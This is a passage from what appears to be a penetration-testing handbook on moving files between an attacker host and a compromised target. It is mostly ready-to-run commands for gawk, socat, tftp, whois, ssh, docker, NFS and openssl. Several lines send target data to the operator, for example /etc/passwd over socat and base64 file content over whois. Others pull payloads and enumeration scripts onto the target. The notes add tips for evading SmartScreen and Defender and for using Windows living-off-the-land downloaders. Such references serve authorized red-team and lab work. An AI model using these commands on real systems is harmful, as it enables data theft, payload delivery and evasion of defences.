**Strip the HTTP headers:**
```bash
sed -i '1,/^\r*$/d' /tmp/file.bin
```

**Pure-gawk variant through the `/inet` special file (needs gawk built with network support; mawk has no `/inet`):**
```bash
gawk -v h="$LHOST" 'BEGIN{
  s="/inet/tcp/0/"h"/80"
  print "GET /file.bin HTTP/1.0\r\nHost: "h"\r\n\r" |& s
  while((s |& getline line) > 0) print line
}' > /tmp/file.bin
```

```bash
sed -i '1,/^\r*$/d' /tmp/file.bin
```

### socat

> **Path:** `/usr/bin/socat`

**Download - one-liner (on LHOST: `socat TCP-LISTEN:9000,reuseaddr,fork OPEN:payload.sh`):**
```bash
socat -u TCP:$LHOST:9000 OPEN:/tmp/payload.sh,creat
```

**TLS variant (LHOST: `socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork OPEN:payload.sh`):**
```bash
socat -u OPENSSL:$LHOST:443,verify=0 OPEN:/tmp/payload.sh,creat
```

**Upload to the operator's TCP listener:**
```bash
socat -u FILE:/etc/passwd TCP:$LHOST:9000
```

### tftp

> **Path:** `/usr/bin/tftp`

**Ancient, but still alive on network gear/embedded devices (UDP/69):**
```bash
tftp $LHOST -c get payload.sh
```

```bash
tftp $LHOST -c put data.tar
```

### whois

> **Path:** `/usr/bin/whois`

**A tiny TCP client to an arbitrary host:port - data goes in the request, received on LHOST (`nc -lvnp 43 > data.txt`); text/short strings only:**
```bash
whois -h $LHOST -p 43 "$(base64 -w0 /tmp/sample.txt)"
```

### ssh

> **Path:** `/usr/bin/ssh`

**If SSH is available but scp/sftp isn't - pull/push through `cat`:**
```bash
ssh $LHOST_user@$LHOST "cat /remote/file" > local_file
```

```bash
cat local_file | ssh $LHOST_user@$LHOST "cat > /remote/file"
```

### docker cp

> **Path:** `/usr/bin/docker`

**If the docker socket is reachable - pull a file out of a container/image:**
```bash
CONTAINER=mycontainer
docker cp "$CONTAINER":/path/file ./file
```

### NFS mount

> **Path:** `/usr/bin/mount`

**If NFS is exported - mount it and copy as usual:**
```bash
sudo mount -t nfs $LHOST:/export /mnt && cp /mnt/file .
```

---

## 6. openssl s_server / s_client (transfer over TLS)

> **Path:** `/usr/bin/openssl`

For when you need an encrypted channel without a full web server.

**LHOST SHELL - generate a certificate:**
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

**LHOST SHELL - start the server and serve the file (port 80 needs root; 4443 works fine):**
```bash
openssl s_server -quiet -accept 4443 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

**RHOST SHELL - receive the file:**
```bash
openssl s_client -connect $LHOST:4443 -quiet > LinEnum.sh
```

**LHOST SHELL - or serve files as an HTTPS server (`-WWW` = from the current directory; 443 needs root):**
```bash
openssl s_server -accept 8443 -cert certificate.pem -key key.pem -WWW
```

---

## 7. Notes

> **Where the "URL downloaders" drop the file.** Many of them (`InstallUtil`, `Ngen`, `Presentationhost`, `Xwizard`, `mshta`, `msoxmled`, `ECMangen`, the Office apps, `Scrobj.dll`, `PhotoViewer.dll`, `Shimgvw.dll`) put the payload into **`INetCache`**: `%LOCALAPPDATA%\Microsoft\Windows\INetCache\`. Look there if it says it downloaded but you can't find the file.
>
> **SmartScreen/AV.** For `msedge.exe`, add a harmless extension (`.txt`, `.zip`); for `MpCmdRun.exe`, copy it out of Defender's platform folder and run it from there.
>
> **Text vs binary.** `findstr`, `print`, `type` and `lynx` work line by line/as text - for binaries use `certutil`, `esentutl`, `extrac32`, `socat`, `nc`.
>
> **UNC methods** (`type`, `esentutl`, `expand`, `extrac32`, `replace`, `print`, `makecab`, `diantz`) require a share on the operator side - [03](03-smb.md)/[04](04-webdav.md).
>
> **Upload methods**: `ConfigSecurityPolicy` (file first, then URL!), `CertReq -Post`, `DataSvcUtil`, `type > \\host\share`, `TestWindowRemoteAgent` (DNS). Receivers - [02](02-target-to-attacker.md).
>
> **Freshness.** The list changes with every Windows patch - check [LOLBAS](https://lolbas-project.github.io/) and [GTFOBins](https://gtfobins.github.io/).

---

**See also:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [05 - FTP](05-ftp.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [07 - Netcat](07-netcat.md) · [12 - DNS / ICMP](12-dns-icmp.md)

---

## Variable forms

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export DOMAIN=t.attacker.com
# usage: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
set DOMAIN=t.attacker.com
:: usage: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
$DOMAIN = "t.attacker.com"
# usage: $LHOST
```

More on this - [README](../../README.md).

---

[← Back to the handbook](../../README.md)
